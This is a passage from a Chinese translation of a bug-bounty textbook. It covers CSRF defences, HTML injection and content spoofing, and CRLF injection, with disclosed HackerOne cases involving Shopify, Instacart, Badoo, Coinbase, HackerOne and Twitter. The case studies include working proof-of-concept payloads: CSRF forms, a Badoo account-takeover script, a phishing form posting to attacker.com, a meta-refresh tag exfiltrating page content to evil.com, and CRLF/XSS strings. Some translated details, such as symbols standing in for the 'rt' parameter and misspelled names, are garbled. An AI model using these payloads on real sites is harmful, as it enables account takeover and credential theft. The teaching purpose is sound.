你可以通过多种方法缓解 CSRF 漏洞。防御 CSRF 最流行的形式之一是 CSRF 令牌。保护站点在提交可能更改数据的请求时需要 CSRF 令牌。在这种情况下，Web 应用（如 Bob 的银行）会生成一个包含两个部分的令牌：一个供 Bob 接收，另一个由应用程序保留。当 Bob 尝试发起转账请求时，他必须提交他的令牌，银行随后会在本地进行验证。这些令牌的设计使其无法被猜测，且仅供特定用户（如 Bob）访问。此外，它们的名称并不直观，但一些可能的名称示例包括 `X-CSRF-TOKEN`、`li-token`、`rt` 或 `form-id`。令牌可以包含在 HTTP 请求头部中、HTTP POST 体中或作为隐藏字段，如下例所示：



```html
<form method="POST" action="http://bank.com/transfer">
<input type="text" name="from" value="Bob">
<input type="text" name="to" value="Joe">
<input type="text" name="amount" value="500">
<input type="hidden" name="csrf" value="IH7DDDYUnKOhCC66BsPBB8An4p24hxNu6ZuJA8l+YA='">
<input type="submit" value="submit">
</form>
```

移除令牌、更改其值等，以确认该令牌已正确实现。

网站保护自己的另一种方法是使用 CORS；然而，这并不是万无一的，因为它依赖于浏览器安全以及确保正确的 CORS 配置来确定第三方网站何时可以访问响应。攻击者有时可以通过将 `content-type` 从 `application/json` 更改为 `application/x-www-form-encoded`，或者由于服务器端的配置错误，使用 GET 请求代替 POST 请求来绕过 CORS。这种绕过之所以有效，是因为：当内容类型为 `application/json` 时，浏览器会自动发送 `OPTIONS` HTTP 请求，但如果是 GET 请求或内容类型为 `application/x-www-form-encoded`，浏览器则不会自动发送 `OPTIONS` 请求。

最后，还有两种额外的且较不常用的 CSRF 缓解策略。首先，网站可以检查随 HTTP 请求提交的 `Origin` 或 `Referer` 头部的值，并确保它包含预期的值。例如，在某些情况下，Twitter 会检查 `Origin` 头部，如果没有包含，则检查 `Referer` 头部。这之所以有效是因为浏览器控制这些头部，攻击者无法远程设置或更改它们（显然，这不包括利用浏览器或浏览器插件中的漏洞，这些漏洞允许攻击者控制其中任一个头部）。其次，浏览器现在开始实现一种名为 `SameSite` 的新 cookie 属性。该属性可以设置为 `strict` 或 `lax`。当设置为 `strict` 时，浏览器不会向任何并非来自该网站的 HTTP 请求发送 cookie。这甚至包括简单的 HTTP GET 请求。例如，如果你登录了 Amazon 且它使用了 `strict samesite` cookie，那么当你从另一个网站点击链接时，浏览器将不会提交你的 cookie。此外，在你访问另一个 Amazon 网页并随后提交 cookie 之前，Amazon 不会识别你为已登录状态。相比之下，将 `samesite` 属性设置为 `lax` 会指示浏览器在初始 GET 请求中发送 cookie。这支持了 GET 请求绝不修改服务器端数据的设计原则。在这种情况下，如果你登录了 Amazon 且它使用了 `lax samesite` cookie，那么当你从另一个网站重定向到那里时，浏览器会提交你的 cookie，Amazon 会识别你为已登录。

## SHOPIFY TWITTER 断连接

难度：低

URL: https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect/

来源：https://www.hackerone.com/reports/111216/

报告日期：2016年1月17日

赏金：$500

当你寻找潜在的 CSRF 漏洞时，请留意修改服务器端数据的 GET 请求。例如，一个黑客发现了 Shopify 功能中的一个漏洞，该功能将 Twitter 集成到网站中，让商店主发布推文。该功能还允许用户从连接的商店断开 Twitter 账户。断开 Twitter 账户的 URL 如下：

https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect/

结果显示，访问此 URL 会发送一个断开账户的 GET 请求，如下：

```
GET /auth/twitter/disconnect HTTP/1.1
Host: twitter-commerce.shopifyapps.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0)
Gecko/201010101 Firefox/43.0
Accept: text/html, application/xhtml+xml, application/xml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://twitter-commerce.shopifyapps.com/
Cookie: _twitter-commerce_session=REDACTED
Connection: keep-alive
```

此外，当链接最初实现时，Shopify 并没有验证发送给它的 GET 请求的合法性，导致该 URL 容易受到 CSRF 攻击。

提交报告的黑客 WeSecureApp 提供了以下概念证明（PoC）HTML 文档：

```html
<html>
<body>
  <img src="https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect">
</body>
</html>
```

当打开此 HTML 文档时，它会导致浏览器通过 `<img>` 标签的 `src` 属性向 https://twitter-commerce.shopifyapps.com 发送 HTTP GET 请求。

1. 如果某个连接了 Shopify 的 Twitter 账户的用户访问了带有此 `<img>` 标签的网页，他们的 Twitter 账户将与 Shopify 断开连接。

## 经验总结

请留意通过 GET 请求在服务器上执行某些操作（如断开 Twitter 账户）的 HTTP 请求。如前所述，GET 请求绝不应修改服务器上的任何数据。在这种情况下，你可以使用代理服务器（如 Burp 或 OWASP 的 ZAP）监控发送到 Shopify 的 HTTP 请求，从而发现该漏洞。

## 修改用户的 INSTACART 区域

**难度：**低

**URL：** https://admin.instacart.com/api/v2/zones/

**来源：** https://hackerone.com/reports/157993/

**报告日期：**2015年8月9日

**赏金：**$100

当你观察攻击面时，请考虑网站的 API 端点及其网页。Instacart 是一款杂货送货应用，允许其交付人员定义他们工作的区域。该网站通过向 Instacart 管理子域名发送 POST 请求来更新这些区域。一个黑客发现该子域名下的区域端容易受到 CSRF 攻击。例如，该黑客使用了以下代码：

```html
<html>
<body>
<form action="https://admin.instacart.com/api/v2/zones/" method="POST">
  <input type="hidden" name="zone_id" value="1">
  <input type="submit" value="Delete">
</form>
</body>
</html>
```

## 经验总结

当你观察攻击面时，请考虑网站的 API 端点及其网页。Instacart 是一款杂货送货应用，允许其交付人员定义他们工作的区域。该网站通过向 Instacart 管理子域名发送 POST 请求来更新这些区域。

## BADAOO 完全接管

**难度：**中

**URL：** https://www.badoo.com/

**来源：** https://hackerone.com/reports/127703

**报告日期：**2016年4月1日

**赏金：**$852

尽管开发者使用 CSRF 令牌防止 CSRF，但在某些情况下，攻击者可以窃取令牌，正如此漏洞所示。如果你探索社交网站 https://www.badoo.com/，你会发现它使用了 CSRF 令牌。具体来说，它使用每个用户唯一的参数 `π`。当 Badoo 的漏洞赏金计划在 Hacker 上上线时，我没有发现利用它的方法。但黑客 Mahmoud Jamal 找到了。

Jamal 注意了 `π` 参数及其重要性。他还注意到该参数在几乎所有的 JSON 响应中返回。遗憾的是，这并没有帮助，因为 CORS 防止了攻击者读取这些响应，因为它们被编码为 `application/json` 类型。但 Jamal 继续挖掘。

Jamal 最终发现了 JavaScript 文件 https://eu1.badoo.com/worker-scope/chrome-service.js，其中包含一个名为 `url_stats` 的变量，并设置为如下值：

```javascript
var url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';
```

当用户浏览器访问 JavaScript 文件时，`url_stats` 变量存储了一个包含用户唯一值参数的 URL。更好，为了获取用户的 `π` 值，攻击者只需要让目标访问访问 JavaScript 文件的恶意网页即可。CORS 不阻止此类；浏览器允许读取并嵌入远程 JavaScript 文件。攻击者可以使用 `π` 值将任何社交媒体账户与用户的 Badoo 账户关联。结果是攻击者可以调用 HTTP POST 请求来修改目标账户。这是 Jamal 用于实现此利用的 HTML 页面：

```html
<html>
<head>
<title>Badoo account take over</title>
<script src="https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1"></script>
</head>
<body>
<script>
```

```javascript
function getCSRFcode(str) {
  return str.split('=')[2];
}
window.onload = function() {
  var csrf_code = getCSRFcode(url_stats);
  var csrf_url = 'https://eu1.badoo.com/verify.php?code=4/nprspM3yfn2ZSFUBear08QKaXo609JkArgoju1Gz6Pc&author=3&session_state=7cb8219ce7104466c7c=be3037ff54b560..a810&prompt=none&rt='+csrf_code;
  window.location = csrf_url;
}
</script>
```

当目标加载此页面时，页面将通过在 `<script>` 标签的 `src` 属性中引用 Badoo 的 JavaScript。

加载脚本后，网页会调用 JavaScript 函数 `window.onload`，该函数定义了一个匿名 JavaScript 函数。浏览器在网页加载时会调用 `onload` 事件处理器；由于 Jamal 在 `window.onload` 处理器中定义了函数，因此当页面加载时，他的函数始终会被调用。

接下来，Jamal 创建了一个 `csrf_code` 变量，并将 `getCSRFcode` 函数的返回值赋值给它。`getCSRFcode` 函数接收字符串并在每个 `-` 字符处将其分割为字符串数组。它返回数组第三个成员的值。当该函数从 Badoo 漏洞的 JavaScript 文件中解析变量 `url_stats` 时，它会将字符串分割为以下数组值：

https://eu1.badoo.com/chrome-push-stats?ws,1<rt_param_value>

然后该函数返回数组的第三个成员（即 rt 值），并将其赋值给 `csrf_code`。

一旦获得了 CSRF 令牌，Jamal 就创建了 `csrf_url` 变量，该变量存储了指向 Badoo `/google/verify.shtml` 页面的 URL。该网页将他的 Google 账户链接到目标的 ⑤。页面需要某些参数，这些参数被硬编码在 URL 字符串中。我在这里不会详细介绍它们，因为它们是 Badoo 特有的。但是，请注意最后的 `π` 参数，它没有硬编码的值。相反，`csrf_code` 被连接到 URL 中，从而作为 `π` 参数的值传递。随后，Jamal 通过调用 `window.location` ⑥ 发起 HTTP 请求并将其赋值 `csrf_url`，这将访问者的浏览器重定向到 ➩ 处的 URL。这导致向 Badoo 发起 GET 请求，该请求验证 `π` 参数并处理请求将目标的 Badoo 账户链接到 Jamal 的 Google 账户，从而完成账户接管。

## 启示

有烟必有火。Jamal 注意到 `π` 参数出现在不同的位置，特别是在 JSON 响应中。因此，他正确地猜测 `π` 可能会出现在攻击者可以访问并利用它的地方，在这种情况下，是一个 JavaScript 文件。如果你觉得某个网站可能存在漏洞，请继续挖掘。在这个案例中，我认为 CSRF 令牌只有五位且包含在 URL 中这很奇怪。通常情况下，令牌要长得多，更难以猜测，并且包含在 HTTP POST 请求体中，而不是 URL 中。使用代理并检查当你访问网站或应用程序时调用的所有资源。Burp 允许你搜索特定的术语或值，这会揭示包含在 JavaScript 文件中的 `π` 值。你可能会发现包含敏感数据（如 CSRF 令牌）的信息泄露。

## 总结

CSRF 漏洞代表了另一种攻击向量，攻击者可以在目标甚至不知或未主动操作的情况下执行攻击。发现 CSRF 漏洞可能需要一些技巧，并且愿意测试网站上的所有功能。

通常情况下，应用程序框架（如 Ruby on Rails）在网站执行 POST 请求时会越来越多地保护 Web 表单；然而，对于 GET 请求并非如此。因此，请务必留意任何更改服务器端用户数据的 GET HTTP 调用（例如断开 Twitter 账户）。此外，虽然我没有包含示例，但如果你看到某个网站在 POST 请求中发送 CSRF 令牌，你可以尝试更改 CSRF 令牌值或将其完全删除，以确保服务器正在验证其存在性。

## 5 HTML 注入与内容伪造

![](img/0e0c482eb94dba4b95528b396562dd10_104_0.png)

超文本标记语言 (HTML) 注入和内容伪造是允许恶意用户向网站网页中注入内容的攻击手段。攻击者可以注入自己设计的 HTML 元素，最常见的是模仿合法登录界面的 `<form>` 标签，以欺骗目标将敏感信息提交到恶意网站。由于此类攻击依赖于欺骗目标（这种做法有时被称为社交工程），漏洞赏金计划认为内容伪造和 HTML 注入不如本书书中涵盖的其他漏洞那么严重。

当网站允许攻击者提交 HTML 标签（通常通过某些表单输入或 URL 参数），这些标签随后直接渲染在网页上，就会发生 HTML 注入漏洞。这与跨站脚本 (XSS) 攻击类似，不同之处这些注入允许执行恶意的 JavaScript，我将在第 7 章讨论。

HTML 注入有时被称为“虚拟劫改”。这是因为开发者使用 HTML 语言来定义网页的结构。因此，如果攻击者可以注入 HTML 且网站渲染它，攻击者就可以更改页面的外观。这种欺骗用户通过虚假表单提交敏感信息的技术被称为钓鱼。例如，如果页面可以渲染你控制的内容，你可能会添加一个 `<form>` 标签要求用户输入用户名和密码：

```html
<form action='http://attacker.com/capture.php'>
<input type='text' name='username'>
<input type='password' name='password'>
<input type='submit' value='submit'>
</form>
```

当用户提交此表单时，信息将发送到攻击者的网站 1。内容伪造与 HTML 注入非常相似，不同之处在于攻击者只能注入文本，而不是 HTML 标签。这种限制通常由于网站在发送 HTTP 响应时转义了任何包含的 HTML 标签造成的。虽然攻击者无法通过内容伪造来格式化网页，但他们可以插入看起来像合法的文本。此类信息可以欺骗目标执行操作，但它高度依赖社交工程。以下示例演示了如何利用这些漏洞。

## 通过字符编码进行 Coinbase 注释注入

**难度：** 低

**URL：** https://coinbase.com/apps/

**来源：** https://hackernone.com/reports/104543

**报告日期：** 2015年12月10日

**奖励：** $200

某些网站会过滤 HTML 标签以防御 HTML 注入；然而，通过理解字符 HTML 实体的原理，有时可以绕过。对于此漏洞，报告人员发现 Coinbase 在渲染用户评论时会解码 HTML 实体。在 HTML 中，某些字符是*保留的*，因为它们有特殊用途（如用于开始和结束 HTML 标签的角度括号 `<>`），而*非保留字符*是没有特殊含义的普通字符（如字母）。保留字符应该使用它们的 HTML 实体进行渲染；例如，`>` 字符应该渲染为 `&gt;`。但非保留字符可以使用 HTML 实体渲染；例如，字母 *a* 可以渲染为 `&#97;`。

对于此漏洞，报告人员首先在文本输入字段中输入纯 HTML：

```html
<h1>test</h1>
```

Coinbase 不会过滤 HTML 并将其作为纯文本渲染，因此提交的文本看起来将与输入的完全一致。然而，如果用户以 HTML 值提交文本，如下：

```html
&#60;h1&gt;This is test&#60&gt;
```



# Coinbase HTML 注入漏洞

Coinbase 将此字符串解码为 HTML，导致网站在提交的评论中渲染 `<h1>` 标签：

# This is test

使用 HTML 编码值，黑客演示了如何让 Coinbase 渲染用户名和密码字段：

```html
<input type='text' name='username'>
<input type='password' name='password'>
```

这生成的 HTML 如下所示：

```
Username:<br>
<input type="text" name="firstname">
Password:<br>
<input type="password" name="lastname">
```

这些被渲染为文本输入表单，看起来像是一个输入用户名和密码登录的地方。恶意黑客可以利用该漏洞欺骗用户将实际表单提交到恶意网站，从而在那个地方捕获凭据。然而，该漏洞取决于用户是否被欺骗并认为登录是真实的，这并无法保证。因此，Coinbase 奖励的奖金比一个不需要用户交互的漏洞要低。

## 核心要点

当你测试一个网站时，请检查它如何处理不同类型的输入，包括明文和编码后的文本。留意那些接受 URI 编码值（如 `%2F`）并渲染其解码后值的网站，在这种案例中，它们会被渲染为 `/`。

你可以在 `https://gchq.github.io/CyberChef/` 发现一个包含编码工具的强大“瑞士军军刀”。去查看一下并尝试它支持的各种类型编码。

# HACKERONE 意外的 HTML 包含

**难度：** 中等

URL: `https://hackerone.com/reports/<report_id>/`

来源：`https://hackerone.com/reports/110578/`

报告日期：2016年1月13日

赏金金额：$500

此示例以及后续章节需要对 Markdown、悬挂单引号（hanging single quotes）、React 和文档对象模型（DOM）有理解，因此我将先介绍这些主题，然后介绍它们是如何导致两个相关漏洞的。

Markdown 是一种标记语言，使用特定的语法生成 HTML。例如，Markdown 会接受并解析以哈希符号（`#`）开头的明文，返回格式化为标题标签的 HTML。标记 `# Some Content` 会生成 `<h1>Some Content</h1>`。开发者经常在网站编辑器中使用 Markdown，因为它是一种易于操作的语言。此外，在允许用户提交输入的网站上，开发者不需要担心格式不规范的 HTML，因为编辑器会为他们生成 HTML。

我在这里讨论的漏洞使用了 Markdown 语法生成带有 `title` 属性的 `<a>` 标签。通常情况下，这种语法是：

```
[test](https://torontowebsiteddeveloper.com "Your title here")
```

括号之间的文本成为显示的文本，括号内则包含链接的 URL 以及一个 `title` 属性，该属性包含在一对双引号中。这种语法创建了以下 HTML：

```
<a href="https://torontowebesitedveloped.com" title="Your title tag here">test</a>
```

在 2016 年 1 月，漏洞猎人 Inti De Ceukela 发现 HackerOne 的 Markdown 编辑器配置错误；结果是攻击者可以在 Markdown 语法中注入一个悬挂单引号，该引号会被包含在生成的 HTML 中，只要 HackerOne 使用了 Markdown 编辑器。漏洞赏金计划的管理页面以及报告都存在漏洞。这具有重大意义：如果攻击者能够在管理页面中找到第二个漏洞，并在页面开头的 `<meta>` 标签中注入第二个悬挂单引号（通过注入 `<meta>` 标签或在 `<meta>` 标签中找到注入点），他们就可以利用浏览器的 HTML 解析来外泄页面内容。原原因是 `<meta>` 标签告诉浏览器通过标签 `content` 属性中定义的 URL 刷新页面。在渲染页面时，浏览器会对识别出的 URL 发送 GET 请求。页面中的内容可以作为 GET 请求的参数发送，攻击者可以使用它提取目标数据。以下是一个带有注入单引号的恶意 `<meta>` 标签的示例：

```
<meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=
```

`0` 定义了浏览器在向 URL 发送 HTTP 请求之前等待的时间。在这种情况下，浏览器将立即向 `https://evil.com/log.php?text=` 发送 HTTP 请求。该 HTTP 请求将包含从 `content` 属性开始的单引号到攻击者使用网页上的 Markdown 解析器注入的单引号之间的所有内容。这里有一个示例：

```html
<html>
<head>
<meta http-equiv="refresh" content="0; url=https://evil.com/log.php?text=
</head>
<body>
<h1>Some content</h1>
--snip--
<input type="hidden" name="csrf-token" value="ab34513cdfe123ad1f">
--snip--
<p>attacker input with 2</p>
--snip--
</body>
</html>
```

从 `content` 属性后的第一个单引号 1 到攻击者输入的单引号 2 之间的页面内容将作为 URL 参数的一部分发送给攻击者。其中包含在内的还有来自隐藏输入字段的敏感跨站请求伪造（CSRF）令牌。

通常情况下，HTML 注入的风险对 HackerOne 来说并不是问题，因为它使用 React JavaScript 框架来渲染其 HTML。React 是 Facebook 开发的一个库，用于在不重新加载整个网页的情况下动态更新网页内容。使用 React 的另一个优点是，该框架会转义所有的 HTML，除非使用 JavaScript 函数 `dangerouslySetInnerHTML` 直接更新 DOM 并渲染 HTML（DOM 是一个用于 HTML 和 XML 文档的 API，允许开发者通过 JavaScript 修改网页的结构、样式和内容）。事实证明，HackerOne 使用了 `dangerouslySetInnerHTML`，因为它信任从服务器接收到的 HTML；因此，它直接将 HTML 注入 DOM 而不进行转义。

尽管 Deukelaire 没有利用该漏洞，但他识别出了在 HackerOne 渲染 CSRF 令牌之后，他能够注入单引号的页面。因此从概念上讲，如果 HackerOne 未后的代码更改允许攻击者在同一页面的 `<meta>` 标签中注入另一个单引号，攻击者就可以外泄目标的 CSRF 令牌并进行 CSRF 攻击。HackerOne 同意这种潜在风险，解决了该报告，并奖励了 Deukelaire $500。

## 核心要点

理解浏览器渲染 HTML 和响应某些 HTML 标签的细微差别，可以开启巨大的攻击面。虽然并不是所有程序都会接受关于潜在理论攻击的报告，但这些知识将帮助你发现其他漏洞。FileDescriptor 对 `<meta>` 刷新漏洞有非常棒的解释，地址为 `https://blog.inner.ht/csp-2015/#contentexfiltration`，我强烈建议你查看。

# HACKERONE 意外的 HTML 包含绕过

**难度：** 中等

URL: `https://hackerone.com/reports/<report_id>/`

来源：`https://hackerone.com/reports/112935/`

报告日期：2016年1月26日

赏金金额：$500

当组织创建一个修复方案并解决报告时，该功能并不总是没有漏洞的。在读完 De Ceukelaire 的报告后，我决定测试 HackerOne 的修复方案，看看它的 Markdown 编辑器如何渲染意外输入。为此，我提交了以下内容：

```
[test](http://www.torontowsebiteddeveloper.com "test ismap="alert xss" yyy="test")
```

回想一下，为了使用 Markdown 创建锚点标签，通常提供一个 URL 和一个在括号内双引号包裹的 `title` 属性。为了解析 `title` 属性，Markdown 需要跟踪起始双引号、其随后的内容以及结束引号。

我好奇是否可以通过额外的随机双引号和属性来混淆 Markdown，以及我是否会错误地跟踪这些内容。这就是我添加 `ismap=`（有效的 HTML 属性）、`yyy=`（无效的 HTML 属性）以及额外双引号的原因。提交此输入后，Markdown 编辑器将代码解析为如下：

```
<a title="test" ismap="alert xss" yyy="test" ref="http://www.torontowsebiteddeveloper.com">test</a>
```

注意，来自 Deukelaire 报告的修复导致了一个意外的漏洞，导致 Markdown 解析器生成任意 HTML。尽管我无法立即利用此漏洞，包含未转义的 HTML 就足以作为一个概念证明（PoC），让 HackerOne 撤回了其之前的修复，并使用不同的解决方案修复了该问题。由于可以注入任意 HTML 标签可能会导致漏洞，因此 HackerOne 为我发放了 500 美元的赏金。

## 启示

代码更新并不意味着所有漏洞都已修复。务必测试更改——并保持坚持。当补丁程序部署时，意味着有了新代码，而新代码可能包含漏洞。

# 安全内容内部

## 伪造

- 难度：低
- URL: `https://withinsecurity.com/wp-login.php`
- 来源：`https://hackerone.com/reports/111094/`
- 报告日期：2016年1月16日
- 赏金：$250

Within Security 是一个用于分享安全新闻的 HackerOne 站点，它基于 WordPress 构建，并在页面 `withinsecurity.com/wp-login.php` 包含一个标准的 WordPress 登录路径。一名黑客在登录过程中注意到，如果发生错误，Within Security 会渲染一个 `access_denied` 错误消息，该消息与 URL 中的 `error` 参数相对应：

`https://withinsecurity.com/wp-login.php?error=access_denied`

注意到这一行为后，黑客尝试修改错误参数。结果，该站点将传递给参数的值作为呈现给用户的错误消息的一部分进行渲染，甚至对 URI 编码字符进行了解码。以下是该黑客使用的修改后的 URL：

```
https://withsecurity.com/wp-login.php?
error=Your%20account%20has%20been%20
hacked%2C%20Please%20call%20us%20this%20number%202091876543210%20OR%20Drop%20
mail%20attacker@40mail.com&state=cb04a91ac5%257Cttps%253A%252
F%252Fwith
security.com%252Fwp-admin%252F#
```

该参数作为错误消息渲染，显示在 WordPress 登录字段上方。该消息引导用户联系攻击者拥有的电话号码和邮箱。

关键在于注意到 URL 中的参数被渲染在了页面上。只需测试你是否可以更改 `access_denied` 参数就揭示了这一漏洞。

## 启示

密切关注传递并渲染为网站内容的 URL 参数。它们可能会提供文本注入漏洞，攻击者可以利用这些漏洞对目标进行钓鱼攻击。在网站上渲染的可控 URL 参数有时会导致跨站脚本攻击（XSS），我将在第 7 章中介绍这一点。在其他情况下，这种行为仅允许影响较小的内容伪造和 HTML 注入攻击。务必记住，尽管此报告支付了 250 美元，但这是对 `Within Security` 的最低赏金。并不是所有程序都会重视或为 HTML 注入和内容伪造报告支付赏金，因为类似于社会工程学，这些报告依赖于目标被注入的文本所欺骗。

图 5-1：攻击者能够向 WordPress 备管理页面注入此“警告”。

## 总结

HTML 注入和内容伪造允许黑客输入信息，并让一个 HTML 页面将该信息反射给目标。攻击者可以使用这些攻击对用户进行钓鱼，并诱骗他们访问或向恶意网站提交敏感信息。

发现这类漏洞不仅在于提交纯 HTML，还在于探索网站可能如何渲染你输入的文本。黑客应该警惕操纵直接在网站上渲染的 URL 参数的机会。

# 6 回车换行符注入 (CRLF INJECTION)

某些漏洞允许用户输入在 HTML 和 HTTP 响应中具有特殊含义的编码字符。通常，应用程序在将这些字符包含在用户输入时对其进行清理，以防止攻击者恶意操控 HTTP 消息，但在某些情况下，应用程序要么忘记清理输入，要么未能正确清理。当这种情况发生时，服务器、代理和浏览器可能会将特殊字符解释为代码并更改原始 HTTP 消息，允许攻击者操控应用程序的行为。

编码字符的两个示例是 `%0D` 和 `%0A`，它们分别代表 `↩`（回车）和 `↴`（换行）。这些编码字符通常被称为回车换行符（CRLF）。服务器和浏览器依赖 CRLF 字符来识别 HTTP 消息的区域，例如头部。

当应用程序不清理或不当清理用户输入时，就会发生回车换行符注入（CRLF 注入）漏洞。如果攻击者可以向 HTTP 消息中注入 CRLF 字符，他们就可以实现本章将讨论的两种攻击：HTTP 请求劫持和 HTTP 响应拆分攻击。此外，你通常可以将 CRLF 注入与另一个漏洞结合，以在漏洞报告中展示更大的影响，正如我将在章节后部分演示的那样。为了本书，我们仅提供如何利用 CRLF 注入来实现 HTTP 请求劫持的示例。

## HTTP 请求劫持

HTTP 请求劫持发生在攻击者利用 CRLF 注入漏洞附加第二个请求时。由于应用程序没有预料到注入的 CRLF，它会将两个请求视为单个请求。这种类型的漏洞可以导致缓存投毒、防火墙绕过或 HTTP 响应拆分。在缓存投毒中，攻击者可以使用 CRLF 生成恶意页面。在防火墙绕过中，攻击者通过构造响应 CRLF 来绕过安全检查。在请求劫持中，攻击者可以利用 CRLF 窃取 Cookie 信息。HTTP 响应拆分将在本章后续内容重点介绍，允许攻击者通过注入新的头部来拆分单个 HTTP 响应。取决于漏洞的性质，攻击者可以使用两种方法之一利用 CRLF 产生响应。然而，攻击者只能注入有限数量的字符。例如，他们可以注入 `Location` 头部。注入 `Location` 头部允许攻击者将 CRLF 漏洞与重定向结合，将目标发送到恶意网站或进行跨站脚本（XSS），我们将在第 7 章中介绍这种攻击。

## Shopify.com 响应拆分

- 难度：中
- URL: `v.shopify.com/last_shop?<YOURSITE>.mysify.com`
- 来源：`https://hackerone.com/reports/106427/`
- 报告日期：2015年12月22日
- 赏金：$500

2015年12月，HackerOne 用户 krankopwnz 报告 Shopify 未验证传入 URL `v.shopify.com/last_shop?<YOURSITE>.mys.com` 的 `shop` 参数。Shopify 向此 URL 发送 GET 请求以设置记录最后登录商店的 Cookie。结果是攻击者可以在 URL 的 `last_shop` 参数中包含 CRLF 字符 `%0d%0a`（大小写不影响编码）。当这些字符被提交时，Shopify 将使用完整的 `last_shop` 参数在 HTTP 响应中生成新的头部。以下是 krankopwnz 作为商店名称一部分注入的恶意代码，用于测试此漏洞是否有效：

```
%0d%0aContent-
Length:%200%0d%0a%20aHTTP/1.1%20%200OK%0d%0aContent-
Type:%20
text/html%0d%0aContent-Length:%2019%0d%0a%20a<deface></html>
```

由于 Shopify 使用未清理的 `last_shop` 参数在 HTTP 响应中设置 Cookie，响应包含了浏览器解释为两个响应的内容。`%20` 字符代表编码空格，在接收响应时会被解码。

浏览器收到的响应解码为：

+ - Content-Length: 0

HTTP/1.1 200 OK

Content-Type: text/html

Content-Length: 19

?<html><deface</html>

响应的第一部分将出现在原始 HTTP 头部之后。原始响应的内容长度被声明为 0，这告诉浏览器响应体中没有内容。接下来，CRLF 开启了一个新行和新头部。该文本设置了新的头部信息，告诉浏览器存在第二个响应，其格式为 HTML 且长度为 19。然后，头部信息告诉浏览器在 2 处渲染 HTML。当恶意攻击者使用注入的 HTTP 头部时，可能会引发多种漏洞；这些我们将在第 7 章中介绍的 XSS。

## 核心要点

留意那些网站接受输入并将其作为返回标头的一部分的情况，特别是在它设置 Cookie 的时候。如果你在某个网站上看到这种行为，请尝试提交 `%0D%0A`（或在 Internet Explorer 中使用 `%0A%20`）来检查该网站是否妥妥地防止了 CRLF 注入。如果没有防止，请测试你是否能够添加新的头部或整个 HTTP 响应。这种漏洞在用户交互较少（例如在 GET 请求中）发生时最容易被利用。

## TWITTER HTTP 响应拆分

- 难度：高
- URL: `https://twitter.com/i/safety/report_story/`
- 来源: `https://hackerone.com/reports/52042/`
- 报告日期：2015 年 3 月 15 日
- 赏金：3,500 美元



# 在寻找漏洞时，记住要跳出定式思维

在寻找漏洞时，记住要跳出定式思维，提交编码后的值以观察网站如何处理输入。在某些情况下，网站会使用黑名单来防止 CRLF 注入。换句话说，网站会检查输入中的任何黑名单字符，然后通过删除这些字符或不允许发送 HTTP 请求来做出相应响应。然而，攻击者有时可以通过字符编码来绕过黑名单。

## Twitter CRLF 注入漏洞案例

2015 年 3 月，FileDescriptor 操纵了 Twitter 处理字符编码的方式，发现了一个漏洞，允许他通过 HTTP 请求设置 Cookie。

当 FileDescriptor 向 `https://twitter.com/i/safety/report_story/`（一个 Twitter 遗迹功能，允许用户举报不当广告）发送 HTTP 请求时，该请求中包含了一个参数。在响应时，Twitter 还会返回一个包含在 HTTP 请求中提交的参数的 Cookie。在测试期间，FileDescriptor 注意到 CR 和 LF 字符被列入黑名单并过滤了。Twitter 会将任何 LF 替换为空格，并在接收到 CR 时返回 HTTP 400（坏请求错误），从而防止 CRLF 注入。但 FileDescriptor 知道一个 Firefox 的漏洞，该漏洞会错误地解码 Cookie，并可能允许用户向网站注入恶意载荷。对此漏洞的了解使他测试 Twitter 上是否存在类似的漏洞。

在 Firefox 漏洞中，Firefox 会剥离 Cookie 中 ASCII 字符范围之外的 Unicode 字符。然而，Unicode 字符可以由多个字节组成。如果多字节字符中的某些字节被剥离，剩余字节可能会导致在网页上渲染恶意字符。

受 Firefox 漏洞启发，FileDescriptor 测试了攻击者是否可以使用相同的多字节字符技术通过 Twitter 的黑名单溜入恶意字符。于是 FileDescriptor 发现了一种以 `%0A`（一个 LF）结尾的 Unicode 字符编码，但其其他字节未包含 HTTP 字符集中。他使用了 Unicode 字符“嘘”，其编码为 U+560A (56A)。当此字符在 URL 中时，它会被用 UTF-8 编码为 `%E5%98%8A`。这三个字节 `%E3`、`%98`、`%8A` 绕过了 Twitter 的黑名单，因为它们不是恶意字符。

当 FileDescriptor 提交此值时，他发现 Twitter 不会过滤 URL 编码字符，但仍会将 UTF-8 的 `%E5%98%8A` 值解码回其 Unicode 值 `560A`。Twitter 会丢弃 `56` 视为无效字符，留下换行符不受影响。此外，他还发现字符“뺨”（编码为 560D）也可以用于向 HTTP 响应中插入必要的回车符（`%0D`）。

一旦他确认该方法有效，FileDescriptor 将值 `%E5%98%8A%E5%98%8DSet-Cookie:%20test` 传递到 Twitter 的 URL 参数中。Twitter 会解码这些字符，剥离超出范围的字符，并在 HTTP 请求中保留 `%0A` 和 `%0D`，导致产生值 `%0A%0DSet-Cookie:%20test`。CRLF 将 HTTP 响应拆分为两个，第二个响应仅包含 `Set-Cookie: test` 值，这是用于设置 Cookie 的 HTTP 头部。

当 CRLF 攻击允许 XSS 攻击时，可能会更加危险。虽然利用 XSS 的细节对于本示例并不重要，但应该注意到 FileDescriptor 在此概念证明中更进了一步。他向 Twitter 展示了如何利用以下 URL 通过 CRLF 漏洞执行恶意 JavaScript：

```
https://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%BA%E5%98%8Dcontent-type=html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%29
```

# 跨站脚本 (XSS) 漏洞

跨站脚本 (XSS) 漏洞最著名的例子之一是 Samy Kamkar 创建的 Myspace Samy 虫。2005 年 10 月，Kamkar 利用了 Myspace 的一个漏洞，允许他在个人资料中存储 JavaScript 载荷。每当登录的用户访问他的 Myspace 页面时，载荷就会执行，让查看者成为 Kamkar 的朋友，并更新其个人资料显示“samy 是我的朋友”。然后，代码会复制到查看者的个人资料中并继续感染其他 Myspace 用户页面。

## XSS 原理

